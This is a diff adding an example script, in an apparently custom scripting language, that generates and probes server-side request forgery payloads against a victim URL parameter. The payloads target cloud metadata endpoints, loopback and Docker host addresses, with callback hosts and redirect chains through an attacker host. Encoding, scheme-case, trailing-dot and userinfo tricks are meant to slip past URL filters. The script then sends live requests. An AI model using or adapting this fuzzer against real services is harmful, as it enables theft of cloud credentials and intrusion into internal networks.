@@ -1,0 +1,96 @@
+# examples/ssrf_endpoint_fuzzer.flx
+# Kullanım:
+#   python -m fluxion -s examples/ssrf_endpoint_fuzzer.flx \
+#     -D base="https://victim.example/view?url=" \
+#     -D oast=d41r8ucgtqkrv6t72u0gmht8euiepuo44.oast.live \
+#     -D token=$(date +%s) \
+#     -D redirect_base="https://attacker.example/r?u="
+
+let base          = base ?? "https://victim.example/view?url="
+let oast          = oast ?? "d41r8ucgtqkrv6t72u0gmht8euiepuo44.oast.live"
+let redirect_base = redirect_base ?? "https://attacker.example/r?u="
+let t             = token ?? "fluxion"
+
+# OAST kandidatları
+let o1 = join("http://", t, ".", oast, "/")
+let o2 = join("http://", t, "-a.", oast, "/path?a=1")
+let o3 = join("http://", t, "-b.", oast, "/b?x=1#frag")
+
+# Internal hedefler
+let meta     = "http://169.254.169.254/latest/meta-data/"
+let meta_v6  = "http://[fd00:ec2::254]/"
+let loop80   = "http://127.0.0.1:80/"
+let docker   = "http://host.docker.internal/"
+
+# Redirect-chain (redirector -> internal)
+let rc_meta   = join(redirect_base, url_encode(meta))
+let rc_loop   = join(redirect_base, url_encode(loop80))
+let rc_docker = join(redirect_base, url_encode(docker))
+
+# Varyant üreticiler
+fn enc_once(u){ return url_encode(u) }
+fn enc_twice(u){ return url_encode(url_encode(u)) }
+fn schema_weird(u){ return replace(u, "http://", "hTtP://") }
+fn trailing_dot(u){ 
+  # domain sonuna nokta ekle (DNS çözümünde bazen filtre atlar)
+  # sadece OAST domainli URL'lerde anlamlı
+  return replace(u, oast, join(oast, "."))
+}
+fn at_userinfo(u){
+  # http://@host/ formu (bazı filtreler hostu yanlış parse eder)
+  return replace(u, "http://", "http://@")
+}
+
+# Tek payload’ı bir dizi varyanta aç
+fn expand(u){
+  return [
+    u,
+    enc_once(u),
+    enc_twice(u),
+    schema_weird(u),
+    trailing_dot(u),
+    at_userinfo(u)
+  ]
+}
+
+# Base paramına göm
+fn wrap(u){ return join(base, url_encode(u)) }
+
+# Aday listesi
+let raw_candidates = [
+  # OAST
+  o1, o2, o3,
+  # Internal direkt
+  meta, meta_v6, loop80, docker,
+  # Redirect chain
+  rc_meta, rc_loop, rc_docker
+]
+
+# Genişlet ve base’e sar
+let out = []
+for u in raw_candidates {
+  let variants = expand(u)
+  for v in variants {
+    out = out + [ wrap(v) ]
+  }
+}
+
+# Hızlı bir canlılık kontrolü (ilk 5 payload için HEAD)
+let probes = []
+let limit = 0
+for p in out {
+  if (limit >= 5) { break }
+  let h = http_head(p)
+  probes = probes + [ {"url": p, "head": h} ]
+  limit = limit + 1
+}
+
+echo value=jsonify({
+  "token": t,
+  "base_prefix": base,
+  "count": len(out),
+  "sample_probes": probes,
+  "payloads": out
+})
+
+return len(out)
